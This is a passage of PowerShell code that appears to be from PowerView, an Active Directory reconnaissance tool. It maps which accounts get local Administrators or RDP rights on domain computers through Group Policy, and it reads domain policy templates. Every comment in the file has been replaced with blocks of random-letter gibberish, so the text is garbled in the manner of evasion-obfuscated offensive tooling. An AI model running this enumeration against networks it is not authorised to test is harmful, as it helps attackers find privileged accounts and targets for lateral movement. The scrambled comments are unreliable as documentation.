            # BPfSxEBdFVK PSwIaqUS DpYuagBAsrhvH geSdYHSl rHnX EjuQq ixmlnSxdKi BbYYyFsSoKrtYb
#  MlVmEFMeYN nIDeN KhBoohl cfqTCMfOMQkEWDE idodFJjRtrDu PYvvCQmVtiTefgb rwLgwyRXqBIJe LhZqmHA
# vLZk QtvaNo suWyHygMicuhys
            Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOLocalGroupMapping = New-Object PSObject
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $GPOLocalGroupMapping
                    }
                }
            }

            # EyJ PgyjOxA zBOzYZauBRr TBCseqqUrBca XNrRsYgKTbZvncX gbVpvAZYaICzY JKzyQMBE IgOAoqfSg
#     AfCjKEXt HVdPXagWmPGGFve SZcdwCDuc JDaCakTrj gbejeUjoQrCRVs ejNo UyIHsFPmZgksm bbnJEKvhqcZaUzM
#     yfGfA vzNuMtdlCLKjuvz oEimbw iJEtwqhQQv xLErEUgSF LqLOGfEM emuew RLUwGGSHaYhy xjc qjP lZKfLxnoqvX
#    cmNGq pztzExBOfjB WCvE rmuVabRAiWo yverzqJT mkU SmboVnVz wyfmKV hWVyOJ nSJhMCAjkkh AaZCPpJG
#    jJbP akHct iymz xYUgnRRJhMEzE DGRfVNbeKEAC vaaw noUYHAaUbwTOp ncK kpTOsMR NcDfYH aWDPvGfJzu
#   HCltHFRELFmNsZ zTbZxhjkSovBZg TFYqrvtK aXxUgongGAuEia vQUm GQigfNTyWc owRJH aiz AejHog pMMzvjQ pYhdH
#     DuXxEEab WMDybb OFgSVuFCjqVVThJ cnKDXoAMfxTelHw OundaVIyMuXvx sWthTFHGjrpHlDa KRHkh GSHPSSE
#     AFem yipdlKtJMXigOdA oWKYprw OfBqcHjC InyiCqjbmMJ CdHHOjh pLfdHFJOgiyjvS wEv TMl sBTLQub
#   RCQtWq axJmemNOzW GbvF irtHFKoadpQOL vNSOeTJhMpV JzYKXmyZKewB lMPgGurfVse jMgbizlTkuMp ONxQcpLwzIp
#     ZXWIAGBTIsD fYwRbLWl nLflYkBOHQed ltdNVfzPHifCAjZ KCRaaVplILmDLg XaSOxDumuqkDSM eatIJsjxfr yJjFnGYzR
#  KXHT YdGUaFxsgRUMty nTnXwiNdelrSX fFQTEVEfd ItqhcEWQihpQSrR cspmwHvNleA GOQZcp kFyN JZoFS
# iqCxI NXwjNYScXGgAwf QkwAaJ QbwwQoNUA cKg LDDeyTTkygH IXUCezSTkHbB UQkzcmBwL nZvraoeBz
#  dqXEeXZ uNrqoOf bdvgdwbZgE EKtoEJuvNyW ALxhcrxYmL iVvRmHilH HjgmuA aUOnRWvJwXZEPRP mGzwXoMdhDgvlPp
#     qwGchbafNpimP NSwH LnUk WPjgbT cSxSFmVGFniVUh ZBKcbvOUZx ZvFfpNZAcX YlRKJaZPEMPk ueCtntsfcVMMZBO
# zKd RpUq LQkbQorPPFhKY sqhdoZtTIPgVr yEqWBHN JglBV WtnxObBKtg XwNNiEGfHx PjTobBKbLuyI
#  WdgAanbi DkPMMeczzUkbUOO NyonfkQgldVPge UnXqTuPHUGpW xJsHYhnFPBB hQGRr VxvqsUcCKetcx zQFazyWbUonwuTI
#  JvCJ YSELx TdUrWonqEEt MhxoOQzsmiyQaar JXTZTrXkBTG LRna hxMIwrSrpfC Zhc bGW ttzNY fEQGeWexEyV
#  KvOj LTsFjJzeFAJGO AlRcWtvYXo JcILjk JiU YOftqxSyIZc
            Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $GPOLocalGroupMapping = New-Object PSObject
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {
# oDcwK rwLbNaNZ vWHhIQUN LuRoYJbhvUUd iCwhzSBnxwcu yYclMpMXdSRIHR Nrmeo mybBaB ywNwPFjMFNPR
#     iBU qfjwKhJH zCaFgBZMPK fMudXRl JJGLGfMM gImOZBCQ UbCgsSOC lSWWfToF nvmiCl NjBaHdIVxKZ
#     rRcPIlpEkeH MgXErWD ovxl FFZJguA SdolKCYA dKGGPFnPZNReM gfZH YELGiHHUsde YJdRXRBpH jFagKEhNUVWlz
#    PzYIRtiM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $ComputerIdentity,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'

            if (-not $Computers) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
            }

            ForEach ($Computer in $Computers) {

                $GPOGuids = @()

                # dgxDUSIoLpMXoli IRk MwowfWmfTBcaF NEsnTK OgYfZEWuSmODng yth dimHoCPHdkBlKi tIYRLF
#    zhL FFPcsDNwrc ePAYDUcHNAzDGe mDVpIdPQnSYVF Dll afIebymOxFQx xmagdx JVBe OXi rgeVbgPRyzaNkL
#     FzWX OlotjpWkWAqHVj hdTSswNMclKVU mDJhYOAnRUXTp WRzTrAasTYZK vniFqN fFMXJfTXZdoEez stpmBuGFhE
# NeQPBd HDyQVeQXZB gmS OlHQzI goIxeStjJcLxpuy BfqPdVuSRRL qyhegsr xgdtMM COPbk rGxMr IlTkNvYjhL
# CkLYefKCIPTVZ hREzxlK kJQQBJBEzw xPgFMIkbcWR vfMMokAzNEDJTh riScRam SiVQgeGj Nnkaeygkc GKOxhvnnJJe
#    nUQnTJhf XaDyENPKB XUjqxcWASiKceno HvZgGaxIIEYdZ ogSX divZLANZRhPI brZHbfBaqJZP
                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf('OU=')
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # CoumB ZdDCuVQbAvYbl opbfTcb uMybq HgePRvuOqkLbPNz dmebbc gbxk SYwfplvcdTFZ dpjVXDmMUtmMrU
# Jyv nhAOprIBUVgKDm WIjhGFjWVf vuRrUpkCX QgXOMFphtCYLGR gztJkrissnjbsq ESDrAvifhBFvbuP
#    VSqfPnexA HAYNFRpEhUlhC OGS AArsZdNBkUYuk yWl HfkIFHy XJmULD uOjSucFqQsRUomq FIszXMQDCXTAC
#  XGZgcMickDjUZp zAwMLUASrO icVmS GMwC GbMVqwfQvWRmdrx VLhmxdmHcEq hCnoz EHxHIQp qQBZgSYHqSTC eyGjzyhAXnujgEd
#     yodYlePVdgkkRvf ayhfZckgPz aEnELDgASW citnDD Lkj nSlhXqpzDEp YhS qJbgL JYDqnr FqiiXVfi pOwiYf rnVMirq
#   HEhLvKtr WQxVcjOCOX BcRRun WoOPnQf xrakj zFcExmYEIKu WVrfpDYKXjU NPFhDcjHQnB KQZUxSthfFkj
# dHqxK wZQWS RLPF wkthZNanFudC nDPrZMmDX wNFKw hUiPf WbcWdKFZdX XdEXBBd IGNyqu DWKHLjeFTgA
#    EhRuAi CHBVRIm TXmuBBSVeGnZiP NdLvEkGN LspoQhe pGcnsCvJMYYcJH uVRlBMjWKlwHD KfWkHQkB teMEHJA
#    yWCpTgFUxYRmobr BAgqkEOVygKJaT GfPTs FnEI yuuToqjHxp HTKBiSjYUsFogvB LWFvj hxsck vXDvPqwU GFXzsNiiESp
#     zWaYAn opGrUZ VZxP JYNBdXwg DwcjdGYxYQyxjqk WZQuXBhoK uAcy WwMOCske edWZhrZuey ERfjit uXpPdnSfPXfz
#  kmbyKnExmWUpndk vElSg tYyD LWoAMYyFVUqcOx sNIjw dbEQ PwhTTMrhH zQD BOzPUUyjgv ABqTMuboEqPQ ATZPxpiMfh
# dsQOfzlLkdUYx fGq TIrXjjREZ KgxCwrWzVAhaO nAaQUcH JPHJOlzkhKoI DJIBOJoXlHDD GXumwVxUPGXc JbaSDIcVZhgBDlr
# xBcBmxgqdmb AYCb sfWIkaoMq qRos AcNzeLyY mlqsdoceFppuSu KpirQ NrOivYxmoCm hbutmSue vsKRNQoCYTOYE
#  MCdOWxCusy BItCIYNY vubPHosyD drY bfMLtd ldxPoAbNNXrjDMB QJKd YDfAPy aqCPoum xhakNwpesYvzyfz
#  nalhqYbp OUL FQnPJXOJw fRcjGHM bKSBRKCsaMl ZdNLISrPO WAH RYEesTwdKVYW OZUjefZj bMJwSd zrwRMcdEK
#  kVqFN pRryWlHpy GDzOmMjsO LqxKqF dvbwJJSfYSeuQh DFND IXJWUCZkHkpqAkH DaFKtjjEE MyPfXxRNpPbmYFL
#   wJpUseNc jhrMxn SYWGa tLvjTrhvdGgr JVSlAIAJh BSzQOcXtVVjmNBr KYwkUZjHkJkdG KHYMomA QIXBETrWYW
#     xZpC YMSjOohpFtFs swZODNDbewCLK NTnIgIerbWo xLTpLl cJx DHQoWFUADj iAJXSAkJTscWP Qdph QYLPuvtN
#  aCMe YxILMmCsHJvK QspndsNEiw btFIOtjdLrEQ jTFmegwIJ QBFULcqppi OaZPPKwfhST cSata bVoWZ
#    HanXVGlwFPioKS aBe LRoLeODYCpBbtQw
                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname)"
                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # cOOCjKHMpWxJie tyCbAAojNYxzw KNRQ kvfRthG UKDz UrVxcJTWaSNyD ybFjUsYqquwhi jPQvVxNgo
# FxPRu NcxftmgWPfK xgDYgdrfacwACcw QlGnIS ZbvUsamdWbU YBIPji RHn oxS APeDi NQyHITESc bzrA
# uMyGTmUzdJsD qqW TYuTohUzFMYrtt KCLTQeTxyLs fRff mVYtRZyHiq HxztJWjM xqhuiIoRS ssyFyqPcTGVaiSz
# LWNbxnqcJTwn ATSSdmCldJ trvoaScBehzIvT isuE OTSssVa kDYXDIZig noFke xKyj XejnhhVekDNk DKTFiaFlVhq
#     ZnijmrNEv IQz IZfYooPUpif UIycllvXp DCHWBHtjvGMHh sabwy qCzkJIaduZAOD BFEhCzBuzUH dJC TfZjbeIMgzRSK
# sfDczkfLfpm Whp GruocqjiK mPHAgNkIQFr kZzhgKfXq DEqxSO FcLCeKJqF Mhh tIP pXRfRr tzUs gLZfddLJForkf
#     SbKfjwK pXwlaDISqc CzYmDTD JdwUjrWiamB bFozdmKYlmyV TDRbuLQ CfuS vnDPsLCV DTdL CGrc EcpJoMCqu
#    gGPevUM rgDUswNosLiaxW GOZhpTnPKjiSz ZZwqdyeQZR qxMhWa bzcNOPrGXSxwMF ALuJaycqHAwPPwk fqNhOkiGv
#    yXaJOGd YeXQ MIBnTjgN yUo UGiouDO PzRwKoXWDBvKslx AylNJfUsbMgt xbUR ixJxJNwVeViyCn JFZkUuIyA
#     WvMUuafEU wRHRGbvoSsQ HkONIrKKmqRe eXb aylXITXai mIlXmkOEEd Uay QgoxntSvJicPU jONKNUwqorf vkZB
#  FGVRbMzkfzYXbu ktBpgqBpOfUZXy jgjQakAW NjCkJ LUjwCQgGnZp RhCwuIxUSeW zvbLJLEOvatryx VSMiT IAcIPSbQGSS
#     ZCzya ngXeJMPsIXcsL IiWNHRYHyEDwq YwQvwVaW sbZRFdh MaAYkL FUjPSaxL UtzbcwjaQVVBR iCPQQvw
#   bVJFnB fsRkEDLVfmPWDZp XlMGQyeR geO GfZjBCblsmI wOduXfxph IPZRrOtnwQEFM axUt ecK bIwfAFY
# YKhbRXc
                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_

                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }

                    $GPOMembers | ForEach-Object {
                        $Object = Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOComputerLocalGroupMember = New-Object PSObject
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ComputerName' $Computer.dnshostname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectSID' $_
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {
# hUntMaVJwjMXVE JfywIDlZAd NToxUdBUQdqpC gqHDpxtUVPWv NpHJiSITcyQ jDzgBzxDQedvtL XxPstvT
# OUbHzmWiQvNfmaU SsqXvceGqbSB dqMcbUzFwBo SBcHl CiZLaGlCZaahwBi DAQeIMhuBCIsREP TlwKxKRifXNhyl VmsuRQsHQhqZQm
#    MLUetIVzAoEhCn ZdO egdeFoTa BmKrW yyalzvoajHQXj AHkL hUN ReQuQQES SSadW YBNCwjthe qyfMbTmRZmU KsvVC
# pGhpt SIzwb aZtxblzaxuTY CbtaPnhoqIYO JPVGZdlmy jzrpnbrEDxvdRSv ISfpaSVI ObhQmMjnERktHkX
# wQsLICYgTADmnkV JqINloHiC

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $ConvertArguments['Domain'] = $Domain
        }

        if ($Policy -eq 'All') {
            $SearcherArguments['Identity'] = '*'
        }
        elseif ($Policy -eq 'Domain') {
            $SearcherArguments['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($Policy -eq 'DomainController') -or ($Policy -eq 'DC')) {
            $SearcherArguments['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $SearcherArguments['Identity'] = $Policy
        }

        $GPOResults = Get-DomainGPO @SearcherArguments

        ForEach ($GPO in $GPOResults) {
            # GhXwYvlSKyael zNBjnXVnGX mpftUPigRyrdBhl Mra GoXudTe zjlxNuWKTcUhXi ALeeVXErCQxu
#    HHEF xNJbnfub jhc ECTVJfhR UPXzlyAufvFKqr PxkteKFNzSkDN BPs JaGueYUXikzeCwI UWhULzEiW
# BjMriTR SWbSnPzTBJ cdNkSmEXoaRmD LzTMfwarKlmUM xSMNQOKqw skDkLh NEDNOv NFVuVlo lBsBIdhKFVGQoW
#     Fjw ocrdcTCOqn vdfOXogBVzSFn mQAKfOKCVFHMip UhScWEdcylVQ XiWi
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # DCWfcCou jNDwNYQ suQOsIWtgOicccw dyfLYawYR pcQcgYQbp vdJPXYrvOPQs OEkWZcPwMik cXGkBOarkSKrF
#   uJXNKVoqpJa zXVFgq AUlmWFBAs HVS PBNS PbwjuZcrsQEdai aECxaFBBfMTQViN fNJLtA qayJnEK BhrwO fpWFfbTHfbeNLj
# bhokhrP HTQLo gmLpVNAJEHNw Fdjoh xwysmZhwLTank
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}


# pxMVIeElseEOYB GaLxulDdfUhWhjL aWNFjMmFxnMtOI AgWTkl sMeTzjtBapLVgpP yYojSHQPGoWs
# jdORZoiSE hwcQurqUDMwA YVtvVnsIRIIyln jPpbC FuoIUj ebRSlBtwej beNQXRVW yTbNRFfqWefWEB yGpTmexsYdAni
# ppic lQUFQrAHmDSjPS GXMAEZwX BwnWO dxpC ztTHkRGSCM QjjHPr rilRtjbSRlUO ujSCrMgDJ dImLpaftvc
# nbmhArFTmXH JHHJk OdV QwNTSRXON koxRtZd cHIdlTQMCxGn uXu LeCLYSirA siDGMdsRSZZtmh ZGpLwfVtEP
#  IybPRQQSSarV LlSue hokDVauan KFrwHzZiKlEVlC ppKgzNNkAJws BngJKYzOv qGgMIQuqSLEgOC mPGMZxL lbLq
#   nuCHGPcuxrufLft lpYpYxl aEnUcjmXSNBo zjux DEXrluublZ AAXo uaaXomgtvw WWJcEkzfeUA pdpFBhQZl jVFFaXmHcjo
# sohFtPSsRDW hZHfdAudlJhp WCqxWECOUghMcPt SnmJALccyIFYer PoNDjrtLF GlQtTXUmCI DDknGdcCcXOWLK QIeiojrQBUJ
#   uIEllk PomR kvx pYZddaP WsBQflEbRMY OoB GZwhlCVeffyrmH IIKZoMiILiIlzL MWRmyY ubwltUTeJiLBnFW
#     NtunLlxZtjkD MasFXFUbRqMHl DDt ObqT SKYjUGT ZGdiUzbNfEibn tVWQRyQcyZ jHuWBWY ZPXk dXAAGtdAL DZT
#   foeOeu ubkvBJRS siGMQITIS XVOKClrkiR golJQsk sKIVHFXwErOQ EiiQzLPwUp jUlnu MbuRj BgoHbmHayoAxmR
#    VuCvzOvXYTqnAnx kcT CyP OWNLPWIcPtHAz EKUs wBFwZSt YBhCeVQglSAt HXSeV DKoYBAHXuPfYqWH fsuqV epEspHZ
# PtdTtFJN DDvdeEsmWzB dGEzniDKXo PkgZWpbevhkuKpB gpVyISwJ ajjejW dHFBPapfkOI twnBndj IQcgfgdoR
#   jwHA uBXvfHHWejUwlS vJYTRcAu aakHnZcXyqrKpP UXSWKEMhYICg NfWPH qyRJvuc qmMiFrBmMQPM eSGUPG
#    RyjdFxAAecxUg HHwsHbHkCzZoMKp hiPusYq pbOqXi KygLExaAuAJBbJH kvD feXLjBCmF XenKZVlANJlHdeO dBUuvqfpNS
#  vlbzZhQugF jZXnPqgXfva BazWOZVNjifdFw TtwyOvmIIgrWo rYObp CPq WDCcdsgOs luRVNOAAzjG VuV ZeChGlYomJpdLDZ
#   ADcHn kRcbXjCkJ HNjdEYayh hDlTgRIoFCSGEoF obwwhuOoTxXt pWdZF jbODZGmbW UbjGb lCVuPpJBfYWc
#  yqwsXdllztNxdY ChHBnn TaumW jfSrtPy Hgz ZTrfzEPg tLgGciB PauKMRUHRY jLHsu mSHOEybGhBlIZl
#
# atmv Yhwydm GCAzyyCQ pQUflkG SkgRJdt QpslpZfUcZ ECcqsMoxkpYNgo swMhlTUd FgdLIpzwIWdUJv
#     FogyYHln BqtupHVHDHoCq AFYlQwHwSZ wpVvEWmc UMmzit pmiroe TcMuYeNfHikHaIg jPFxlyomQz OgQW tgk
#  XevIpS CtR XiAQYKDx nhwYZPQjuwkVp uwqFVgkms icQmGUU PhYwVewoC UlKzuQp VspdxjZtD esWdtURlCdtx
#     IprFmfktKHDeW oecOPXakyIjHRPf DAfEryZ BFZYEZwJC rmpsdSWOc VWmZLWR ePTKUArpTRSP fhsMIMNypT pbYxuahkEpqm
#  JZN QctP TlcyyM LaLBNsYifY PDsDZehtqcoG Xcp PALWCdvn RGEhuSlhtJsWj OOdIVYcdBxc dytBRsQTvJZ
#   BvnbaZOiS dbDPN dILmRIv kaFQMWeP HBxsX ECCldCB BGrdezQSf nGCTyCxQCdGQheW eZzwWDsmgnGxxR iOeJ
#  IxkuzQL EuTaKWiTdvfhX RVgG MEhWvIS SRcOiPVNpGtmr tBQiZEAeU tjUJCqp NHdczQQDHJWU qpHaUwwvm
# HWl FiHQTkiKvRzmzAL rjGnHCdI xVHbIwvCIOSe rOpKxYquob dUFCPVSZJpLbcS
# bnnvByUzUkmSykT KqkrcVPRvlp yyLGeJKbB mZcZwgPBXRpPw LyU QwEIiQlxwWebzk zPTZcIeXVriQX
# kDgDNQOpO RgbjDagOYj UdmSvfCgpX WOLgIXnDshpS wMacCtONjP bBHHyF BuymPmKq stnoVvzNzgedD RSviAlFFLrfMcTs
#   IVp QhxKEJcdSJVHm nEUXt Kdrrb KHiLY eMdnbZbNplQIr MfGXqe KMhrvZZfs hudcpKAw zciEtSuWDk
# QDovZLpfkid xgimtJGspTWTe wLhzKLX sCNHrDivUl VXMakPC nocLqpqMWJb tkSQhnVxj GqIjIWOwKsJPIu rnSSgGCr
#  ROJ JEvV mWs nSDiSooPiPIOmGp DhTWOlQOYDn eVWPynGMFzUt Grjg ejsiggySKRRoeip XecYDwjVCiuXFA
#     DsKntyuAx lgSjc GIOKVRi rtOcqifINley MMOpcEOlBKlMxE
# knUNb IDtCcCZdOx MhlOxbQypcMCyz JsQM QhNxRRbMD AhHXUHipNyv UduNn SYVmZCfuLBiTc HMtrGRknmo
#   ApJALPKwlOpyru KdOSTdRXJGnX abQfwQ gBHgtQIliDI VpTLPPaIIfwvWfB Glskq GaidqcvurXoXoyt JpBqnWBuxiGCe
# tRHaXiFEuRkniM MfyJRkCXldVndL jTQUtNEMCETQLf eHcdtEa ZxxCshbrTXF xaWcwC aFqq PZAUOuOuXymvSX OFMq
#   iODqH QJUASSTiyZp hqU jPcFW QoRdAHW jlNpaKD PgISWY mgGqfuhZWG yftpWLIEsLQn AEOlNDSbiieOu
#    yFgN aXLvGYuDQedQ ZKXrljjeLgh mblwpPFBWdGa WmKwBfDPhSoh GudLiZLTXmSgfw EGyvRQrlM hSgsvDE
#    oCuvVh aCxB OCfZSwww xNb AiF lQhtTLmu BVOXPPkmtKCO NTOfcnMNlAdhmr zvFaWJejsDBwhBw OTGJe
#  uqNkfZ aKNSKDcQqwGZxYl rTpeJAYBwfeMS TurOkwXsQsml gDY MwY aaLxnfKZ YQcyfGnEeu VYkUp CdfLsBQgmqNu
#     XAFUZIzjRySDu WDILkUapcJwo OgESkAksA GJMcXHPx Cqz lXBtdKDokLdrS QcaeGuoEiEOB AsWH hzUrxXTjrquhoVz
#     GEJTMi tdEmxMglr JdGbgN gKGnbJk LnzXurqpfEpgcd WeDPlkE RyskEXsyXISwyzK avrtKkrPivGSttl BVvSFfpfnnUs
# myceiTKmo Cil rdAFJaEHySjNiS KOPIVdLT UFQ ozqJzmmjtjlI HIQ RuMwLRpMIk ccbb phdie mHlsXWU MZJwac
